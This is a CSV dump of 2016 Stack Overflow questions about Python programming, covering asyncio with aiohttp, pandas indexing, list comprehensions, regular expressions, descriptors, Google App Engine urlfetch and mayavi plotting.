Id,OwnerUserId,CreationDate,Score,Title,Body
39857796,6922035.0,2016-10-04 16:51:40+00:00,2,use asyncio update some data timely and present via aiohttp?,"<p>I am in trying to write a snippet to study Python asyncio. The basic idea is:</p>

<ol>
<li><p>use a ""simple"" web server (aiohttp) to present some data to user   </p></li>
<li><p>the data return to user will change promptly</p></li>
</ol>

<p>here is the code:</p>

<pre><code>import asyncio
import random
from aiohttp import web

userfeed = [] # the data suppose to return to the user via web browsers 

async def data_updater():  #to simulate data change promptly
    while True:
        await asyncio.sleep(3)
        userfeed = [x for x in range(random.randint(1, 20))]
        print('user date updated: ', userfeed)


async def web_handle(request):
    text = str(userfeed)
    #print('in handler:', text)  # why text is empty?
    return web.Response(text=text)

async def init(loop):
    app = web.Application(loop=loop)
    app.router.add_route('GET', '/', web_handle)
    srv = await loop.create_server(app.make_handler(), '127.0.0.1', 8000)
    print('Server started @ http://127.0.0.1:8000...')
    return srv

loop = asyncio.get_event_loop()
asyncio.ensure_future(data_updater())  
asyncio.ensure_future(init(loop))
loop.run_forever()
</code></pre>

<p>the problem is, the code is running (python 3.5), but the <code>userfeed</code> is always empty in browsers and also in <code>web_handler()</code> :-(</p>

<ol>
<li>why <code>userfeed</code> is not been updated?</li>
<li>regarding this <code>timely date update</code> function, because the update mechanism might be more complex later say async IO wait may be involved, is there a better way instead of using <code>while True: await asyncio.sleep(3)</code> in <code>data_updater()</code> to get ""more roughly precise"" timer? </li>
</ol>
"
39945178,194000.0,2016-10-09 15:19:34+00:00,2,Why does `set_index` create an index label for the column name?,"<p>I have a CSV file which begins like this:</p>

<pre><code>Year,Boys,Girls
1996,333490,315995
1997,329577,313518
1998,325903,309998
</code></pre>

<p>When I read it into pandas and set an index, it isn't doing quite what I expect:</p>

<pre><code>df = pd.read_csv('../data/myfile.csv')
df.set_index('Year', inplace=True)
df.head()
</code></pre>

<p>Why is there an index entry for the column label, with blank values next to it? Shouldn't this simply disappear?</p>

<p><a href=""http://i.stack.imgur.com/6pkxa.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/6pkxa.png"" alt=""enter image description here""></a></p>

<p>Also, I'm not clear on how to retrieve the values for 1998. If I try <code>df.loc['1998']</code> I get an error: <code>KeyError: 'the label [1998] is not in the [index]'</code>.</p>
"
39857691,4251877.0,2016-10-04 16:44:48+00:00,2,Python array_flip analogue or best way to do this?,"<p>Is there array_flip (php) analogue for Python 3.x? </p>

<p>from</p>

<pre><code>obj = ['a', 'c', 'b' ]
</code></pre>

<p>to </p>

<pre><code>{'a': 1, 'c':2, 'b': 3}
</code></pre>
"
39857515,268977.0,2016-10-04 16:32:42+00:00,2,Google App Engine urlfetch DeadlineExceededError in push task handler running apiclient batch request,"<p>I have a task handler that is making a batch request to the Google Calendar API. After 5 seconds, the request fails with <em>DeadlineExceededError: The API call urlfetch.Fetch() took too long to respond and was cancelled.</em>  I have changed <code>urlfetch.set_default_fetch_deadline(60)</code> near where I make the batch request, as suggested <a href=""http://stackoverflow.com/questions/13051628/gae-appengine-deadlineexceedederror-deadline-exceeded-while-waiting-for-htt"">here</a> but it does not seem to make a difference: the deadline seems to remain 5 seconds.</p>

<p>I am using the Python Google API Client library which sits on top of oauth2client and httplib2. But my understanding is that GAE intercepts the underlying calls to use urlfetch.Fetch. This is what the stack trace seems to show as well. </p>

<p>Can you see any reason why <code>urlfetch.set_default_fetch_deadline</code> does not seem to be working?</p>

<h2>EDIT:</h2>

<p>This is the code used to build the batch request:</p>

<pre><code># note `http` is a oauth2client authorized http client
cal = apiclient.discovery.build('calendar','v3',http=http)
req = cal.new_batch_http_request(callback=_callback)
for event in events:   # anything larger than ~5 events in batch takes &gt;5 secs
  req.add( 
    cal.events().patch(calendarId=calid, eventId=event[""id""], body=self._value) 
  )
urlfetch.set_default_fetch_deadline(60)  # has no effect
req.execute()
</code></pre>
"
39945615,6917599.0,2016-10-09 16:02:32+00:00,2,"Converting input string of integers to list, then to ints in python?","<p>I want the user to input an integer (6 digits long, so 123456 rather than just 1), and then convert that input into a list, <code>[1,2,3,4,5,6]</code>.</p>

<p>I tried this:</p>

<pre><code>user_input = list(input(""Please enter an 8 digit number"")
numbers = [int(i) for i in user_input]
</code></pre>

<p>I want to be able to perform mathematical stuff with the numbers list, but I keep getting the error ""int is not iterable"". To be frank, I'm not entirely sure what I'm doing, or sure that the ""numbers = [...] "" is even necessary, or if it should just be <code>numbers = user_input</code>. Trying <code>numbers = [i for i in user_input]</code> gets the same error.</p>

<p>Also, I realise I could either run a loop to get each number from the user, or ask them to use commas in between each in order to use the <code>.split("","")</code>, but I'd rather not as it seems messy to the user.</p>

<p>Edit: I've been switching things between versions, so sorry for any confusion. This was written in 2.7, though I intend to use Python 3.</p>
"
39857148,1510846.0,2016-10-04 16:11:55+00:00,2,Dropping multilevel columns from lists of dictionaries in pandas,"<p>I have a dataframe with multilevel columns, like the one in the following MWE:</p>

<pre><code>df = pd.DataFrame([[1,2],[3,4]], columns=[['a','c'],['b','d']], index=['one','two'])
df.columns.names = ['aa', 'bb']
</code></pre>

<p>Which looks like this:</p>

<pre><code>In [267]: df
Out[267]: 
aa   a  c
bb   b  d
one  1  2
two  3  4
</code></pre>

<p>I also have a list of dictionaries like the following:</p>

<pre><code>to_keep = [{'aa':'a', 'bb':'b'}, {'aa':'q', 'bb':'d'}]
</code></pre>

<p>What I'm looking to do:</p>

<p>If the multilevel column labels are in the <code>to_keep</code> list then keep them in <code>df</code>, otherwise drop them from the df.</p>

<p>So for <code>df</code> and <code>to_keep</code> above the resulting dataframe would look like:</p>

<pre><code>aa   a
bb   b
one  1
two  3
</code></pre>

<p>as <code>{'aa':'c', 'bb':'d'}</code> is not contained within <code>to_keep</code>. Is this possible?</p>
"
39946538,6341182.0,2016-10-09 17:38:00+00:00,2,Regular Expression to replace dot with space before parentheses,"<p>I am working on some customer comments that some of them did not follow grammatical rules. For Example <code>(Such as s and b.)</code> in the following text that provides more explanation for previous sentence is surrounded by two dots. </p>

<pre><code>   text = ""I was initially scared of ANY drug after my experience. But about a year later I tried. (Such as s and b.). I had a very bad reaction to this.""
</code></pre>

<p>First, I want to find <code>. (Such as s and b.).</code> and then  replace the  dot before <code>(Such as s and b.)</code> to space. This is my code, but it does not work. </p>

<pre><code>text = re.sub (r'(\.)(\s+?\(.+\)\s*\.)', r' \2 ', text )
</code></pre>

<p>Output should be: </p>

<pre><code> ""I was initially scared of ANY drug after my experience. But about a year later I tried  (Such as s and b.). I had a very bad reaction to this.""
</code></pre>

<p>I am using python.</p>
"
39946666,2109064.0,2016-10-09 17:50:38+00:00,2,Descriptor protocol implementation of property(),"<p>The Python <a href=""https://docs.python.org/3.5/howto/descriptor.html#properties"" rel=""nofollow"">descriptor How-To</a> describes how one could implement the <code>property()</code> in terms of descriptors. I do not understand the reason of the first if-block in the <code>__get__</code> method. Under what circumstances will <code>obj</code> be <code>None</code>? What is supposed to happen then? Why do the <code>__get__</code> and <code>__del__</code> methods not check for that?</p>

<p>Code is a bit lengthy, but it's probably better to give the full code rather than just a snippet. Questionable line is marked.</p>

<pre><code>class Property(object):
    ""Emulate PyProperty_Type() in Objects/descrobject.c""

    def __init__(self, fget=None, fset=None, fdel=None, doc=None):
        self.fget = fget
        self.fset = fset
        self.fdel = fdel
        if doc is None and fget is not None:
            doc = fget.__doc__
        self.__doc__ = doc

    def __get__(self, obj, objtype=None):
        # =====&gt;&gt;&gt; What's the reason of this if block? &lt;&lt;&lt;=====
        if obj is None:
            return self
        if self.fget is None:
            raise AttributeError(""unreadable attribute"")
        return self.fget(obj)

    def __set__(self, obj, value):
        if self.fset is None:
            raise AttributeError(""can't set attribute"")
        self.fset(obj, value)

    def __delete__(self, obj):
        if self.fdel is None:
            raise AttributeError(""can't delete attribute"")
        self.fdel(obj)

    def getter(self, fget):
        return type(self)(fget, self.fset, self.fdel, self.__doc__)

    def setter(self, fset):
        return type(self)(self.fget, fset, self.fdel, self.__doc__)

    def deleter(self, fdel):
        return type(self)(self.fget, self.fset, fdel, self.__doc__)
</code></pre>
"
39855697,6921613.0,2016-10-04 15:01:38+00:00,2,Python sum array of objects into objects,"<p>I have a list (name=carpet) of objects type mini_carpet.
Mini_carpet contains a list of objects called packages.
Packages has various properties, the one interesting to me is nr_buys.</p>

<p>What I want to do is to sum the various nr_buys that are within a mini_carpet, within a carpet.
This is what I have done so far:</p>

<pre><code>for d in range(0, carpet.__len__() - 1, +1):
nr_total = sum(carpet[d].packages[i].nr_buys for i in carpet[d].packages)
</code></pre>

<p>This is giving me an error because list indices must be integers.
Any help?</p>

<p>Thanks! </p>
"
39855525,6044529.0,2016-10-04 14:54:25+00:00,2,List comprehension confusion,"<p>I'm slightly confused by a problem that I'm having and wondered if anyone could help (it seems trivial in my mind so I hope that it genuinely is!)</p>

<p>Basically, I have filtered by a list via the following list comprehension:</p>

<pre><code>depfilt = [s for s in department if 'author' not in s]
</code></pre>

<p>(where department had 154 elements and the resulting depfilt has 72 elements)</p>

<p>Now, I also had a separate list of iD values with 154 elements (<code>subj</code>), for which the indices of this list match those in <code>department</code>. I wanted to retain the correct iD values after the filtering process so used the following line of code:</p>

<pre><code>subfilt = [s for s in subj if 'author' not in department[subj.index(s)]]
</code></pre>

<p>In my mind, I feel this should've worked, but subfilt is actually returning 106 list elements, rather than 72.</p>

<p>Does anybody have any idea why?</p>

<p>Thanks</p>
"
39855410,480441.0,2016-10-04 14:49:58+00:00,2,Is python tuple assignment order fixed?,"<p>Will</p>

<pre><code>a, a = 2, 1
</code></pre>

<p>always result in a equal to 1? In other words, is tuple assignment guaranteed to be left-to-right?</p>

<p>The matter becomes relevant when we don't have just a, but a[i], a[j] and i and j may or may not be equal.</p>
"
39946798,6908374.0,2016-10-09 18:02:38+00:00,2,finding pattern within csv file,"<p>I have a CSV Excel file example:</p>

<pre><code>Receipt Name    Address      Date       Time    Items
25007   A      ABC pte ltd   4/7/2016   10:40   Cheese, Cookie, Pie
.
.
25008   B      CCC pte ltd   4/7/2016   12:40   Cheese, Cookie
</code></pre>

<p>What is a simple way to compare the 'Items' column and find out the most common pattern of the items people buy together and display the top combinations?
In this case the similar pattern is Cheese, Cookie.</p>
"
39840638,279858.0,2016-10-03 21:24:05+00:00,2,Update mayavi plot in loop,"<p>What I want to do is to update a mayavi plot in a loop. I want the updating of the plot to be done at a time specified by me (unlike, e.g., the animation decorator).</p>

<p>So an example piece of code I would like to get running is:</p>

<pre><code>import time
import numpy as np
from mayavi import mlab

V = np.random.randn(20, 20, 20)
s = mlab.contour3d(V, contours=[0])

for i in range(5):

    time.sleep(1) # Here I'll be computing a new V

    V = np.random.randn(20, 20, 20)

    # Update the plot with the new information
    s.mlab_source.set(scalars=V)
</code></pre>

<p>However, this doesn't display a figure. If I include <code>mlab.show()</code> in the loop, then this steals the focus and doesn't allow the code to continue.</p>

<p>I feel what I should be using is a <em>traits</em> figure (e.g. <a href=""http://docs.enthought.com/mayavi/mayavi/building_applications.html"" rel=""nofollow"">this</a>). I can follow the example traits application to run a figure which live-updates as I update the sliders. However, I can't get it to update when my code asks it to update; the focus now is 'stolen' by <code>visualization.configure_traits()</code>.</p>

<p>Any pointers, or a link to appropriate documentation, would be appreciated.</p>

<hr>

<p><strong>EDIT</strong></p>

<p>David Winchester's answer gets a step closer to the solution. </p>

<p>However, as I point out in the comments, I am not able to manipulate the figure with the mouse during the <code>time.sleep()</code> step. It is during this step that, in the full program, the computer will be busy computing the new value of V. During this time I would like to be able to manipulate the figure, rotating it with the mouse etc.</p>
"
